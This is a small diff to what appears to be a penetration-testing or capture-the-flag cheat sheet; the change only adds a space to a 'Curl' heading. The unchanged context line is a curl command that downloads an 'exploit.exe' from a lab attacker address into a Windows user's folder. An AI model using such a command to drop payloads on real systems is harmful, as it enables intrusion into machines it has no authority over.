@@ -1,4 +1,4 @@
-#Curl
+# Curl
 ~~~
 curl http://10.10.14.3/exploit.exe -o "C:\users\tim\exploit.exe"
 ~~~
